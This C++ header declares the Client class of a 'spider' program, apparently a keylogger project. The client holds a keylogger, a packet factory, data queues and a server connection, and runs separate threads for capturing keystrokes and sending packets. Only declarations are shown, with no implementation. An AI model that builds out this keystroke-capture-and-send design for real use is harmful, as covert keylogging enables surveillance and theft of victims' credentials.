#ifndef CLIENT_HPP
# define CLIENT_HPP

# include <iostream>
# include <thread>
# include "CurrentServer.hpp"
# include "Keylogger.hpp"
# include "Executable.hpp"
# include "Queue.hpp"
# include "FileManager.hpp"
# include "OfflineManager.hpp"
# include "PacketFactory.hpp"
# include "ConfigManager.hpp"

namespace spider
{

	namespace client
	{
		class Client
		{

		private:
			std::string						_id;
			ConfigManager					_configManager;
			std::shared_ptr<CurrentServer>	_currentServer;
			std::shared_ptr<OfflineManager>	_offlineManager;
			Executable						_exe;
			Keylogger						_keylogger;
			spider::PacketFactory			_packetFactory;

			DataQueueSP						_dataQueue;
			SendingQueueSP					_sendingQueue;

			std::thread			_threadKeylogger;
			std::thread			_threadPacketFactory;
			std::thread			_threadPacketLog;

			void				startKeylogger();
			void				startPacketFactory();
			void				startPacketLog();
		public:
			Client();
			Client(const std::string& id);
			~Client();
		};

	}

}

#endif /* !CLIENT_HPP */
